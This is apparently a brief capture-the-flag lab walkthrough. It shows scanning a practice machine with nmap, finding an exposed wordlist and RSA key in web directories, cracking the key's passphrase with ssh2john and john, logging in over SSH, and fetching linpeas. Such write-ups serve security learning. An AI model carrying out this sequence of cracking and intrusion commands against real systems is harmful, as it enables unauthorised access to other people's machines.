First started with a initnmap scan found ssh and a websever
nmap -sC -sV -o intscan 10.10.188.182

Started clicking on links on the website and found a upload section and takes me to a non upload page but a place were uploaded files go
http://10.10.188.182/uploads/
found a password list
http://10.10.188.182/uploads/dict.lst
found a note in the index.html file possibale username
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->

found a directory /secret/ and found a rsa key
http://10.10.188.182/secret/secretKey

I tried to crack ssh with username john and the password list i found did not find anything

I did ssh2john and made a hash file and then used john to crack it
ssh2john secretKey > id_rsa.hash
john --wordlist=dict.lst id_rsa.hash

then found a password for the rsa key
letmein          (secretKey)

Then i was able to ssh in
ssh john@10.10.188.182 -i secretKey

then i looked around a bit did not find anything so I went and downloaded linpeas onto the box
